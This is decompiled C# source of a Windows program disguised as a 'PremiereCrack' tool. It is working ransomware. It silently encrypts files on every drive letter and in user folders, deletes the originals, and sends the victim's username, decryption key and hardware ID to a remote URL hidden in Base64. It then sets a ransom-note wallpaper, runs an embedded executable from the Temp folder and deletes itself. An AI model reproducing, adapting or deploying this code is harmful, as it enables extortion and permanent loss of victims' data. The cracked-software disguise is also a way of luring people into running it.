using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using PremiereCrack.My;
using PremiereCrack.My.Resources;

namespace PremiereCrack;

[DesignerGenerated]
public class Form1 : Form
{
	private enum CryptoAction
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	private object userDir;

	private byte[] usr;

	private byte[] web;

	private byte[] n;

	private byte[] txt;

	private byte[] png;

	public string TargetKey;

	public int count;

	public string Extentsion;

	private string Charset;

	private Random rnd;

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	public FileStream fsInput;

	public FileStream fsOutput;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		userDir = "C:\\\\Users\\\\";
		usr = Convert.FromBase64String("QzpcVXNlcnNc");
		web = Convert.FromBase64String("aHR0cDovL2FyaXpvbmFjb2RlLmJwbGFjZWQubmV0L3Juc20vYWRkLnBocD90eXBlPWFkZCZkYXRhPUluZmluaXR5Q3J5cHR8");
		n = Convert.FromBase64String("SW5maW5pdHlMb2Nr");
		txt = Convert.FromBase64String("X1JlY292ZXJfSW5zdHJ1Y3Rpb25zLnR4dA==");
		png = Convert.FromBase64String("X1JlY292ZXJfSW5zdHJ1Y3Rpb25zLnBuZw==");
		Extentsion = "." + GenerateHWID();
		Charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		rnd = new Random();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(TextBox1, "TextBox1");
		((Control)TextBox1).set_Name("TextBox1");
		componentResourceManager.ApplyResources(TextBox2, "TextBox2");
		((Control)TextBox2).set_Name("TextBox2");
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)6);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void encryptAll(string dir)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(dir);
		checked
		{
			try
			{
				FileInfo[] files = directoryInfo.GetFiles("*.*");
				int num = files.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					FileInfo fileInfo = files[num2];
					if (!(fileInfo.FullName.EndsWith(Extentsion) | fileInfo.FullName.EndsWith(".lnk") | (Operators.CompareString(fileInfo.FullName, Assembly.GetEntryAssembly()!.Location, false) == 0) | fileInfo.FullName.EndsWith("desktop.ini")))
					{
						byte[] bytKey = CreateKey(TargetKey);
						byte[] bytIV = CreateIV(TargetKey);
						EncryptOrDecryptFile(fileInfo.FullName, fileInfo.FullName + Extentsion, bytKey, bytIV, CryptoAction.ActionEncrypt);
						if (File.Exists(fileInfo.FullName))
						{
							File.Delete(fileInfo.FullName);
						}
						count++;
					}
					num2++;
				}
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				int num5 = directories.Length - 1;
				int num6 = 0;
				while (true)
				{
					int num7 = num6;
					int num4 = num5;
					if (num7 <= num4)
					{
						DirectoryInfo directoryInfo2 = directories[num6];
						encryptAll(directoryInfo2.FullName);
						num6++;
						continue;
					}
					break;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		string text = "";
		int num = 0;
		do
		{
			if (!(num == 5 || num == 10 || num == 15 || num == 20 || num == 25 || num == 30))
			{
				int index = rnd.Next(0, 61);
				text += Conversions.ToString(Charset[index]);
			}
			else
			{
				text += "xXx";
			}
			num = checked(num + 1);
		}
		while (num <= 30);
		TargetKey = text;
		text = null;
		A_Drive();
		B_Drive();
		D_Drive();
		E_Drive();
		F_Drive();
		G_Drive();
		H_Drive();
		I_Drive();
		J_Drive();
		K_Drive();
		L_Drive();
		M_Drive();
		N_Drive();
		O_Drive();
		P_Drive();
		Q_Drive();
		R_Drive();
		S_Drive();
		T_Drive();
		U_Drive();
		V_Drive();
		W_Drive();
		X_Drive();
		Y_Drive();
		Z_Drive();
		Programms();
		ProgrammsX86();
		ProgrammFiles();
		Documents();
		Pictures();
		Videos();
		OneDrive();
		Music();
		Downloads();
		Desktop();
		Delay(1.0);
		POST(Encoding.ASCII.GetString(web) + Environment.UserName + "|" + TargetKey + "|" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "|" + GenerateHWID() + "|" + count);
		setInst();
	}

	public void setInst()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_01d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		checked
		{
			try
			{
				val2.Clear(Color.Red);
				val2.set_InterpolationMode((InterpolationMode)7);
				val2.set_SmoothingMode((SmoothingMode)4);
				val2.set_TextRenderingHint((TextRenderingHint)4);
				Font val3 = new Font("Segoe UI", 20f);
				try
				{
					Random random = new Random();
					int num = Screen.get_PrimaryScreen().get_Bounds().Height - 1;
					int num2 = 0;
					while (true)
					{
						int num3 = num2;
						int num4 = num;
						if (num3 > num4)
						{
							break;
						}
						int num5 = Screen.get_PrimaryScreen().get_Bounds().Width - 1;
						int num6 = 0;
						while (true)
						{
							int num7 = num6;
							num4 = num5;
							if (num7 > num4)
							{
								break;
							}
							switch (random.Next(1, 150))
							{
							case 1:
								val.SetPixel(num6, num2, Color.DarkGray);
								break;
							case 2:
								val.SetPixel(num6, num2, Color.Red);
								break;
							case 3:
								val.SetPixel(num6, num2, Color.Yellow);
								break;
							case 4:
								val.SetPixel(num6, num2, Color.Blue);
								break;
							case 5:
								val.SetPixel(num6, num2, Color.Pink);
								break;
							case 6:
								val.SetPixel(num6, num2, Color.Green);
								break;
							case 7:
								val.SetPixel(num6, num2, Color.Orange);
								break;
							case 8:
								val.SetPixel(num6, num2, Color.Lime);
								break;
							case 9:
								val.SetPixel(num6, num2, Color.LightBlue);
								break;
							default:
								val.SetPixel(num6, num2, Color.DimGray);
								break;
							}
							num6++;
						}
						num2++;
					}
					SolidBrush val4 = new SolidBrush(Color.Red);
					try
					{
						val2.DrawString(TextBox2.get_Text(), val3, (Brush)(object)val4, (float)((double)Screen.get_PrimaryScreen().get_Bounds().Width / 2.0 - 580.0), 190f);
					}
					finally
					{
						((IDisposable)val4)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			((Image)val).Save(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(n) + Encoding.ASCII.GetString(png), ImageFormat.get_Png());
			string lpvParam = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(n) + Encoding.ASCII.GetString(png);
			SystemParametersInfo(20, 0, ref lpvParam, 3);
			string[] contents = new string[1] { TextBox1.get_Text() };
			if (!File.Exists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(n) + Encoding.ASCII.GetString(txt)))
			{
				File.WriteAllLines(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(n) + Encoding.ASCII.GetString(txt), contents);
				StreamWriter streamWriter = new StreamWriter(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(n) + "_UniqeID.txt");
				streamWriter.Write("UNIQE-ID = " + GenerateHWID());
				streamWriter.Close();
			}
			if (File.Exists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\cmd.exe"))
			{
				File.Delete(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\cmd.exe");
			}
			File.WriteAllBytes(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\cmd.exe", Resources.UI);
			Process.Start(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\cmd.exe");
			TargetKey = null;
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe");
			processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 1 > Nul & Del \"" + Application.get_ExecutablePath() + "\"";
			processStartInfo.CreateNoWindow = true;
			processStartInfo.ErrorDialog = false;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			Application.ExitThread();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	public void Delay(double dblSecs)
	{
		DateAndTime.get_Now().AddSeconds(1.1574074074074073E-05);
		DateTime t = DateAndTime.get_Now().AddSeconds(1.1574074074074073E-05).AddSeconds(dblSecs);
		while (DateTime.Compare(DateAndTime.get_Now(), t) <= 0)
		{
			Application.DoEvents();
		}
	}

	public string GenerateHWID()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
		string s = Conversions.ToString(Operators.ConcatenateObject((object)Environment.MachineName, registryKey.GetValue("ProcessorNameString")));
		registryKey.Close();
		SHA256CryptoServiceProvider sHA256CryptoServiceProvider = new SHA256CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		bytes = sHA256CryptoServiceProvider.ComputeHash(bytes);
		string text = "";
		byte[] array = bytes;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text.ToUpper();
	}

	public static string POST(string URL)
	{
		WebClient webClient = new WebClient();
		webClient.Headers.Add("Referer", URL);
		string text = webClient.DownloadString(URL);
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(URL);
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		string text2 = text;
		byte[] bytes = Encoding.UTF8.GetBytes(text2);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		requestStream = httpWebResponse.GetResponseStream();
		StreamReader streamReader = new StreamReader(requestStream);
		streamReader.ReadToEnd();
		streamReader.Close();
		requestStream.Close();
		httpWebResponse.Close();
		return text2;
	}

	public void Desktop()
	{
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
	}

	public void Music()
	{
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
	}

	public void Documents()
	{
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
	}

	public void Videos()
	{
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
	}

	public void Programms()
	{
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms));
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Programs));
	}

	public void ProgrammsX86()
	{
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86));
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
	}

	public void Contacts()
	{
		encryptAll(Encoding.ASCII.GetString(usr) + Environment.UserName + "\\Contacts\\");
	}

	public void Downloads()
	{
		encryptAll(Encoding.ASCII.GetString(usr) + Environment.UserName + "\\Downloads\\");
	}

	public void UserDirs()
	{
		encryptAll(Encoding.ASCII.GetString(usr) + Environment.UserName);
	}

	public void OneDrive()
	{
		encryptAll(Encoding.ASCII.GetString(usr) + Environment.UserName + "\\OneDrive\\");
	}

	public void ProgrammFiles()
	{
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles));
		encryptAll(Conversions.ToString(38));
	}

	public void Windows()
	{
		encryptAll(Conversions.ToString(36));
	}

	public void Pictures()
	{
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
	}

	public void A_Drive()
	{
		encryptAll("A:\\");
	}

	public void B_Drive()
	{
		encryptAll("B:\\");
	}

	public void D_Drive()
	{
		encryptAll("D:\\");
	}

	public void E_Drive()
	{
		encryptAll("E:\\");
	}

	public void F_Drive()
	{
		encryptAll("F:\\");
	}

	public void G_Drive()
	{
		encryptAll("G:\\");
	}

	public void H_Drive()
	{
		encryptAll("H:\\");
	}

	public void I_Drive()
	{
		encryptAll("I:\\");
	}

	public void J_Drive()
	{
		encryptAll("J:\\");
	}

	public void K_Drive()
	{
		encryptAll("K:\\");
	}

	public void L_Drive()
	{
		encryptAll("L:\\");
	}

	public void M_Drive()
	{
		encryptAll("M:\\");
	}

	public void N_Drive()
	{
		encryptAll("N:\\");
	}

	public void O_Drive()
	{
		encryptAll("O:\\");
	}

	public void P_Drive()
	{
		encryptAll("P:\\");
	}

	public void Q_Drive()
	{
		encryptAll("Q:\\");
	}

	public void R_Drive()
	{
		encryptAll("R:\\");
	}

	public void S_Drive()
	{
		encryptAll("S:\\");
	}

	public void T_Drive()
	{
		encryptAll("T:\\");
	}

	public void U_Drive()
	{
		encryptAll("U:\\");
	}

	public void V_Drive()
	{
		encryptAll("V:\\");
	}

	public void W_Drive()
	{
		encryptAll("W:\\");
	}

	public void X_Drive()
	{
		encryptAll("X:\\");
	}

	public void Y_Drive()
	{
		encryptAll("Y:\\");
	}

	public void Z_Drive()
	{
		encryptAll("Z:\\");
	}

	public byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			int num = 0;
			while (true)
			{
				int num2 = num;
				int num3 = upperBound2;
				if (num2 > num3)
				{
					break;
				}
				array2[num] = (byte)Strings.Asc(array[num]);
				num++;
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num4 = 0;
			int num5;
			do
			{
				array4[num4] = array3[num4];
				num4++;
				num5 = num4;
				int num3 = 31;
			}
			while (num5 <= 31);
			return array4;
		}
	}

	private byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			int num = 0;
			while (true)
			{
				int num2 = num;
				int num3 = upperBound2;
				if (num2 > num3)
				{
					break;
				}
				array2[num] = (byte)Strings.Asc(array[num]);
				num++;
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num4 = 32;
			int num5;
			do
			{
				array4[num4 - 32] = array3[num4];
				num4++;
				num5 = num4;
				int num3 = 47;
			}
			while (num5 <= 47);
			return array4;
		}
	}

	private void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		long num = 0L;
		try
		{
			fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
			fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
			fsOutput.SetLength(0L);
			byte[] buffer = new byte[4097];
			long length = fsInput.Length;
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			CryptoStream cryptoStream = default(CryptoStream);
			switch (Direction)
			{
			case CryptoAction.ActionEncrypt:
				cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
				break;
			case CryptoAction.ActionDecrypt:
				cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
				break;
			}
			int num2;
			for (; num < length; num = checked(num + num2))
			{
				num2 = fsInput.Read(buffer, 0, 4096);
				cryptoStream.Write(buffer, 0, num2);
			}
			cryptoStream.Close();
			fsInput.Close();
			fsOutput.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
